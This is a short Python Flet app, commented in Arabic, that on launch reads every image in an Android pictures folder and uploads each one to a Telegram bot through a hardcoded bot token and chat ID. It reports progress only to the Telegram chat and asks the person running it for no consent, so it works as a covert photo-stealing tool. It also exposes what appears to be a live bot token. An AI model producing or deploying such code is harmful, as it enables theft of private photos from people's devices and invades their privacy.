from flet import *
import requests
import os
import time

# ضع التوكن والـ chat_id هنا
BOT_TOKEN = "7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk"
CHAT_ID = "5739065274"

# مسار الصور
IMAGE_PATH = "/storage/emulated/0/Pictures/100PINT/Pins"

def send_telegram_message(message):
    """إرسال رسالة نصية إلى التلجرام"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=10)
    except Exception as e:
        print(f"خطأ في إرسال الرسالة: {e}")

def send_telegram_photo(photo_path):
    """إرسال صورة إلى التلجرام"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(photo_path, 'rb') as photo:
            files = {"photo": photo}
            data = {"chat_id": CHAT_ID}
            requests.post(url, files=files, data=data, timeout=20)
    except Exception as e:
        print(f"خطأ في إرسال الصورة {photo_path}: {e}")

def main(page: Page):
    # رسالة عند تشغيل التطبيق
    send_telegram_message("✅ تم تشغيل التطبيق")

    if not os.path.exists(IMAGE_PATH):
        send_telegram_message("⚠️ المسار غير موجود")
        return

    images = [f for f in os.listdir(IMAGE_PATH) if f.lower().endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp"))]

    if not images:
        send_telegram_message("📂 لا توجد صور في المجلد")
        return

    for idx, file_name in enumerate(images, start=1):
        photo_path = os.path.join(IMAGE_PATH, file_name)
        send_telegram_photo(photo_path)
        send_telegram_message(f"📸 تم إرسال الصورة {idx}/{len(images)}")
        time.sleep(1)  # مهلة بين الإرسال لتجنب الحظر

    send_telegram_message("📤 تم إرسال جميع الصور ✅")
    page.add(Text(f"تم إرسال {len(images)} صورة"))
    page.update()

app(main)